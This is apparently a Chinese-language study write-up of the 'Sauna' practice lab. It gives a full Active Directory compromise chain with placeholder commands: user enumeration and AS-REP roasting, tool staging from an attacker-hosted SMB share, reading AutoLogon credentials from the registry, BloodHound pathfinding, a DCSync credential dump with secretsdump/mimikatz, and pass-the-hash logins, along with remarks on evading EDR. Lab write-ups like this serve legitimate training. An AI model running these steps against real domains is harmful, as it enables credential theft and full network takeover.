# Sauna

- 練習日期:   2026/04/21
- 考點:       OSINT、AS-REP Roasting、smb 不落地執行、winPEAS Local Privilege Escalation、BloodHound Lateral Movement、DCSync Attack

## OSINT

這題比較神奇的地方在於，網頁本身是沒有漏洞的，必須從網頁上找到線索後，從其他服務（Kerberos）下手，才可以登入機器。本題觀察到網頁上有團隊姓名，透過重組團隊人員的姓名來製作 user list 再做後續的攻擊。

## 其他偵查手法

### smb 掃看看

```bash
smbmap -H <Target_IP> 
smbclient -N -L //<Target_IP>
```

### LDAP 掃看看

```bash
ldapsearch -x -H ldap://<Target_IP> -s base namingcontexts
ldapsearch -x -H ldap://<Target_IP> -b 'DC=EGOTISTICAL-BANK,DC=LOCAL'
```
- DC: 放 Users、Groups、Computers
- CN=Configuration: 放 Sites、子網域、服務設定等
- CN=Schema: 放物件類別、屬性定義等
- DC=DomainDnsZones: 放 DNS 區域資料

### DNS 掃看看

```bash
dig axfr @<Target_IP> <Target_Domain>
```

### Kerberos 掃看看

```bash
kerbrute userenum -d <domain> <userlist.txt> --dc <target_ip>
```

## AS-REP Roasting

透過前面做好的 user list，我們可以對沒有設定 pre-authentication 的帳號進行 AS-REP Roasting 攻擊，來獲取該帳號的 Kerberos 金鑰，進而嘗試破解密碼。

```bash
impacket-GetNPUsers '<Domain>/' -usersfile userlist.txt -format hashcat -dc-ip <Target_IP> -no-pass
```

運氣不錯，噴出了 fsmith 的 hash，接著我們就可以用 hashcat 來破解這個 hash，得到密碼。接著就可以嘗試登看看 winrm 了。

## smb 不落地執行

```bash
impacket-smbserver -username xx -password xx share . -smb2support
```

```powershell
net use \\<Attacker_IP>\share /u:xx xx
cd \\<Attacker_IP>\share
```

## winPEAS Local Privilege Escalation

```powershell
.\winPEAS.exe cmd fast > sauna_winpeas_fast
```

掃出來發現有個 AutoLogon 的設定，這個設定會把密碼以明文的方式存在 registry 裡面，我們就可以直接拿到密碼了。密碼找到之後，可以 `net user` 確認帳號是否存在。

```powershell
cd "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
get-item -path .

# 或者
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" 
```

## BloodHound Lateral Movement

登入 Autologon 的帳號後，我們就可以使用 BloodHound 來分析網域內的權限關係，找出可以 lateral movement 的路徑。

```powershell
# 方法一
.\SharpHound.exe
# 方法二
bloodhound-python -u <username> -p <password> -d <domain> -dc <domain_controller> -c All -ns <target_ip>
```

執行後會取得一個 .zip 的檔案，裡面有一個 .json 的檔案，這個檔案就是 BloodHound 的資料，我們可以把它匯入到 BloodHound 的 GUI 來分析。

基本上，我們可以先到 BloodHound 的搜尋欄位查詢目前的帳號，接著點擊這隻帳號 node 後，選擇 `Outbound Object Control` ，就可以看到這個帳號對哪些物件有控制權，接著我們就可以從這些物件開始往下走，看看能不能找到一條路徑可以到達 Domain Admin。

## DCSync Attack

在本題的例子中，我們發現這隻 Autologon 帳號對 Domain Controller 有 `GetChanges` 和 `GetChangesAll` 的權限，進一步查看 Windows Abuse 資訊後發現，當我們擁有這兩個權限時，可以發動 `DCSync Attack`。`DCSync Attack` 是透過偽裝成一台「新的網域控制站 (DC)」，去向原本的 DC 要求「同步」資料，此時，原本的 DC 就會把所有的帳號資訊（包含 Domain Admin 和 KRBTGT）及 hash 都回傳給我們。

```bash
# 方法一
impacket-secretsdump '<domain>/<username>:<password>@<Target_IP>'
# 方法二
# 直接去 windows 上執行 mimikatz
.\mimikatz 'lsadump::dcsync /domain:EGOTISTICAL-BANK.LOCAL /user:administrator' exit
```

如此一來，我們就可以透過 NTLM hash 來登入這台機器了。

### 登入

```bash
# 方法一：使用 psexec
# 這東西會建立服務，可能會被防毒或 EDR 偵測到
impacket-psexec -hashes <NTLM_Hash> -dc-ip <Target_IP> <username>@<Target_IP>
# 方法二：使用 wmi
# 這東西是透過 wmi (port 135) 下命令，smb (port 445) 回傳結果，相對安靜
impacket-wmiexec -hashes <NTLM_Hash> -dc-ip <Target_IP> <username>@<Target_IP>
# 方法三：使用 winrm
evil-winrm -i <Target_IP> -u <username> -H <NT_Hash>
```